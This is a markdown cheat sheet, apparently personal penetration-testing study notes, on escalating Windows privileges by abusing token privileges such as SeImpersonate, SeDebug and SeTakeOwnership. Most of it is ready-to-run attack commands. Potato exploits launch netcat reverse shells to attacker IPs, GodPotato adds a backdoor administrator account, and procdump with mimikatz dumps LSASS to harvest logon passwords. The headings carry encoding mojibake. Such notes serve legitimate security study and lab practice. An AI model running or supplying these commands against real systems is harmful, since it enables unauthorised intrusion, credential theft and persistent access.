# âœ… Windows Privilege Escalation â€“ User Privileges 

---

## ðŸŽ¯ Quick Wins
- [ ] `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege` â†’ Potato exploit (Juicy, PrintSpoofer)
- [ ] `SeDebugPrivilege` â†’ Dump LSASS or SYSTEM shell
- [ ] `SeTakeOwnershipPrivilege` â†’ Take ownership of sensitive files
- [ ] `SeBackupPrivilege / SeRestorePrivilege` â†’ Copy SAM & SYSTEM files
- [ ] `SeLoadDriverPrivilege` â†’ Load malicious driver
- [ ] `SeSecurityPrivilege` â†’ Access security logs
- [ ] `SeManageVolumeExploit` -> full access to the `C:\`

---
## âœ… Enumeration

```powershell
whoami /priv
whoami /all
```

```c
dir C:\ /a /s | findstr /i "temp programdata"
```

## âœ… SeImpersonate / SeAssignPrimary Token

```c
# Check The Windows Version  & if it's 32 bit or 64 bit
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"

#Token Impersonation - PrintSpoofer 
c:\tools\PrintSpoofer.exe -c "c:\Users\chris\tools\nc64.exe ip 21 -e cmd"
C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
C:\tools>.\PrintSpoofer.exe -i -c powershell.exe 

# Token Impersonation - JuicyPotato
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\Users\chris\Desktop\tools\nc64.exe 192.168.45.171 22 -e cmd.exe" -t *
C:\temp\JuicyPotato.exe -t * -p C:\Users\Public\Documents\sh3ll.exe -l 443

# Token Impersonation - JuicyPotato - Troubleshooting error 
1 . check THe version of the windows
2 . check this website to search of a CLSID https://ohpe.it/juicy-potato/CLSID/
3 . Exploit : C:\temp\JuicyPotato.exe -t * -p C:\temp\shell.exe -l 443 -c "{6d18ad12-bde3-4393-b311-099c346e6df9}" 
1. if it doesn't work try another CLSID

# GodPotato
GodPotato -cmd "cmd /c dir c:\Users\Administrator"
GodPotato-NET2.exe -cmd "cmd /c type c:\Users\damon\DEsktop\proof.txt"
GodPotato -cmd "C:\Users\Public\reverse.exe"

Sometimes the SeImpersonatePrivilege is not the actual intended path so the Godpotato shell will be broken and you will not be able to execute whoami, no output for mimikatz, etc.

GodPotato -cmd "net user /add backdoor Password123" GodPotato -cmd "net localgroup administrators /add Lance"

# RougePotato Exploit
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe ip 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe ip 443 -e cmd" -f 9999

# SharpEfsPotato
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"

# EfsPotato
> EfsPotato.exe "whoami"

# non of them working try?
> BadPotato.exe
> Multipotatox64.exe
> SharpEfsPotato.exe
> SigmaPotato.exe
> RogueOxidResolver.exe

# Old Windows ?
.\Juicy.Potato.x86.exe -l 1360 -p c:\windows\system32\cmd.exe -a "/c c:\users\Public\nc.exe -e cmd.exe 10.10.10.1 8080" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
# Note !!
if it's not working change the '-c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}'
https://github.com/ohpe/juicy-potato/tree/master/CLSID
```

## âœ… SeDebugPrivilege

```c
Note !! : if you have rdp access i can dump the lsass without using procdump

Step1  : Open Task Manager
Step2  : Open Details Page
Step3  : find lsass.exe and press right click
Step4  : Click in Create dump File
```

```c
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

## âœ… SeManageVolumeExploit

[link of the exploit](https://github.com/CsEnox/SeManageVolumeExploit)

```
this exploit will give you a full access to the c:\
```


## âœ… SeTakeOwnershipPrivilege

```c
# Take ownership of file
takeown /f "C:\Sensitive\File.txt"

# Grant full control
icacls "C:\Sensitive\File.txt" /grant user:F

# Read file
type "C:\Sensitive\File.txt"
```
---
---
